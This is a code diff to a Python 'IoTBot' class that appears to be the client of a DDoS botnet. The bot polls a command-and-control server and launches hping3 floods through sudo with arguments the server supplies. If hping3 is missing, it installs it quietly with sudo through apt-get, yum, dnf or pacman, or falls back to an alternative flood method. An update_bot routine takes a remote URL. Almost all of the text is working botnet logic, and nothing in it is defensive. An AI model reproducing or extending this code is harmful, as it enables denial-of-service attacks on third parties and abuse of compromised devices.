@@ -107,7 +107,7 @@ class IoTBot:
             return None
     
     def check_tool_availability(self, tool):
-        """Check if a tool is available in the system"""
+        """Check if a tool is available in the system and try to install it if not"""
         try:
             result = subprocess.run(
                 [tool, "--help"], 
@@ -117,6 +117,73 @@ class IoTBot:
             )
             return result.returncode == 0
         except:
+            if tool == "hping3":
+                self.log("hping3 not found, attempting to install...")
+                return self.install_hping3()
+            return False
+    
+    def install_hping3(self):
+        """Attempt to install hping3 using available package managers"""
+        try:
+            # Try apt-get (Debian/Ubuntu)
+            if subprocess.run(['which', 'apt-get'], stdout=subprocess.DEVNULL).returncode == 0:
+                self.log("Installing hping3 using apt-get...")
+                result = subprocess.run(
+                    ['sudo', 'apt-get', 'update'],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL
+                )
+                if result.returncode == 0:
+                    result = subprocess.run(
+                        ['sudo', 'apt-get', 'install', '-y', 'hping3'],
+                        stdout=subprocess.DEVNULL,
+                        stderr=subprocess.DEVNULL
+                    )
+                    if result.returncode == 0:
+                        self.log("Successfully installed hping3 using apt-get")
+                        return True
+
+            # Try yum (RHEL/CentOS)
+            elif subprocess.run(['which', 'yum'], stdout=subprocess.DEVNULL).returncode == 0:
+                self.log("Installing hping3 using yum...")
+                result = subprocess.run(
+                    ['sudo', 'yum', 'install', '-y', 'hping3'],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL
+                )
+                if result.returncode == 0:
+                    self.log("Successfully installed hping3 using yum")
+                    return True
+
+            # Try dnf (Fedora)
+            elif subprocess.run(['which', 'dnf'], stdout=subprocess.DEVNULL).returncode == 0:
+                self.log("Installing hping3 using dnf...")
+                result = subprocess.run(
+                    ['sudo', 'dnf', 'install', '-y', 'hping3'],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL
+                )
+                if result.returncode == 0:
+                    self.log("Successfully installed hping3 using dnf")
+                    return True
+
+            # Try pacman (Arch Linux)
+            elif subprocess.run(['which', 'pacman'], stdout=subprocess.DEVNULL).returncode == 0:
+                self.log("Installing hping3 using pacman...")
+                result = subprocess.run(
+                    ['sudo', 'pacman', '-S', '--noconfirm', 'hping'],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL
+                )
+                if result.returncode == 0:
+                    self.log("Successfully installed hping3 using pacman")
+                    return True
+
+            self.log("Failed to install hping3: No supported package manager found")
+            return False
+
+        except Exception as e:
+            self.log(f"Error installing hping3: {e}")
             return False
     
     def execute_ddos_attack(self, target, attack_type="syn", duration=60):
@@ -373,33 +440,46 @@ class IoTBot:
     def execute_command(self, command_data):
         """Execute command received from C&C server"""
         try:
-            cmd_val = command_data.get('command', '')
-            # Handle string command (e.g., 'start_ddos <target> <attack_type>')
-            if isinstance(cmd_val, str) and cmd_val.startswith('start_ddos'):
-                parts = cmd_val.split()
-                if len(parts) >= 3:
-                    # e.g., start_ddos <target> <attack_type>
-                    _, target, attack_type = parts[:3]
+            command = command_data.get('command', {})
+            command_type = command.get('type')
+            
+            if command_type == 'ddos':
+                tool = command.get('tool')
+                args = command.get('args', [])
+                
+                if tool == 'hping3':
+                    if not self.check_tool_availability('hping3'):
+                        self.log("hping3 not available, using alternative flood method")
+                        return self.execute_alternative_flood(args[-1])  # Last arg is target IP
+                    
+                    try:
+                        cmd = ['sudo', 'hping3'] + args
+                        self.log(f"Executing command: {' '.join(cmd)}")
+                        
+                        process = subprocess.Popen(
+                            cmd,
+                            stdout=subprocess.DEVNULL,
+                            stderr=subprocess.DEVNULL,
+                            preexec_fn=os.setsid
+                        )
+                        
+                        self.attack_process = process
+                        self.attack_threads.append(process)
+                        self.log("Attack process started successfully")
+                        return True
+                        
+                    except Exception as e:
+                        self.log(f"Failed to execute hping3 command: {e}")
+                        return self.execute_alternative_flood(args[-1])
                 else:
-                    self.log(f"Malformed start_ddos command: {cmd_val}")
+                    self.log(f"Unsupported tool: {tool}")
                     return False
-                return self.execute_ddos_attack(target, attack_type)
-            elif isinstance(cmd_val, str) and cmd_val.startswith('stop_ddos'):
-                return self.stop_attack()
             else:
-                # Fallback to dict-based (original) handling
-                command = cmd_val.lower() if isinstance(cmd_val, str) else ''
-                target = command_data.get('target', '')
-                attack_type = command_data.get('attack_type', 'syn')
-                if command == 'start_ddos':
-                    return self.execute_ddos_attack(target, attack_type)
-                elif command == 'stop_ddos':
-                    return self.stop_attack()
-                else:
-                    self.log(f"Unknown command: {cmd_val}")
-                    return False
+                self.log(f"Unsupported command type: {command_type}")
+                return False
+                
         except Exception as e:
-            self.log(f"Error executing command: {e}")
+            self.log(f"Failed to execute command: {e}")
             return False
     
     def update_bot(self, update_url):
@@ -430,7 +510,7 @@ class IoTBot:
     
     def run(self):
         """Main bot loop"""
-        self.log("Bot started")
+        self.log("Bot started and running")
         
         while self.running:
             try:
@@ -439,9 +519,11 @@ class IoTBot:
                     time.sleep(self.check_interval)
                     continue
                 
-                # Get and execute commands
+                # Get command from C&C server
                 command_data = self.get_command_from_cnc()
-                if command_data:
+                
+                if command_data and command_data.get('command'):
+                    self.log(f"Received command: {command_data}")
                     self.execute_command(command_data)
                 
                 time.sleep(self.check_interval)
